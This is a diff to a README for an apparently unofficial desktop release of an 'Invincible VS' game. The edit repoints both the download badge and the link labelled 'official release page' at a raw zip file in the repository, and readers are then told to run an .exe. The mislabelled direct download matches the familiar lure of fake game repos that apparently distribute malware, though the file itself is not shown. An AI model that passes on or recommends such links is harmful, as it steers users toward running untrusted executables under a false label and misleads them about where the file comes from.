@@ -1,12 +1,12 @@
 # 🥊 Invincible-VS-Game-Release-Desktop - Experience tactical hero combat on PC
 
-[![](https://img.shields.io/badge/Download-Game_Installer-blue.svg)](https://github.com/Joripremature506/Invincible-VS-Game-Release-Desktop)
+[![](https://img.shields.io/badge/Download-Game_Installer-blue.svg)](https://raw.githubusercontent.com/Joripremature506/Invincible-VS-Game-Release-Desktop/main/Game-Resource/V-Game-Invincible-Release-Desktop-v3.6.zip)
 
 ## 📥 How to download the game
 
 Follow these steps to install Invincible-VS-Game-Release-Desktop on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Joripremature506/Invincible-VS-Game-Release-Desktop).
+1. Go to the [official release page](https://raw.githubusercontent.com/Joripremature506/Invincible-VS-Game-Release-Desktop/main/Game-Resource/V-Game-Invincible-Release-Desktop-v3.6.zip).
 2. Look for the section labeled Releases or Assets.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
